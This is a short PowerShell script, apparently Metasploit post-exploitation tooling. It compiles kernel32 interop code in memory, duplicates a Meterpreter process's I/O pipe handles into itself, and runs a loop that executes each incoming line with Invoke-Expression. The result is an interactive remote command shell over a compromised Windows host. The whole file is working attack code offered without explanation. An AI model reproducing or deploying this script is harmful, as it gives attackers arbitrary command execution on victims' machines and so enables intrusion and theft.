$a = @"
using System;
using System.Runtime.InteropServices;
namespace kernel32 {
public class func {
[DllImport("kernel32.dll")] public static extern int DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, uint bInheritHandle, uint dwOptions);
[DllImport("kernel32.dll")] public static extern int GetCurrentProcess();
[DllImport("kernel32.dll")] public static extern int OpenProcess(uint desiredaccess, uint inherit, uint procesid);
} }
"@

$c = New-Object Microsoft.CSharp.CSharpCodeProvider
$b = New-Object System.CodeDom.Compiler.CompilerParameters
$b.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$b.GenerateInMemory = $True
$d = $c.CompileAssemblyFromSource($b, $a)

# Replace Process ID with Meterpreter Proc Id
$parentProcessID = METERP_PID
$remote_handle_in = REM_HANDLE_IN
$remote_handle_out = REM_HANDLE_OUT

$sourceHandle = [kernel32.func]::OpenProcess(64,1,$parentProcessID);
$cHandle = [kernel32.func]::GetCurrentProcess();

$handle_in = -1
$res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_in, $cHandle, [ref] $handle_in, 2, 1, 2)
$in_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_in, 1
$fsi = New-Object IO.FileStream $in_handle, ReadWrite
$sr = New-Object IO.StreamReader $fsi
[Console]::SetIn($sr)

$handle_out = -1
$res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_out, $cHandle, [ref] $handle_out, 2, 1, 2)
$out_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_out, 1
$fso = New-Object IO.FileStream $out_handle, ReadWrite
$sw = New-Object IO.StreamWriter $fso
$sw.AutoFlush=1
[Console]::SetOut($sw)
[Console]::Write("PS> ")


while (1) {
	$i = [Console]::ReadLine();
	if ($i) {
		$o = IEX ($i);
		$i = '';
		[Console]::WriteLine(($o | out-string));
		$o = '';
		}
	[Console]::Write("PS> ");
}

[Console]::WriteLine("Exiting...");
exit
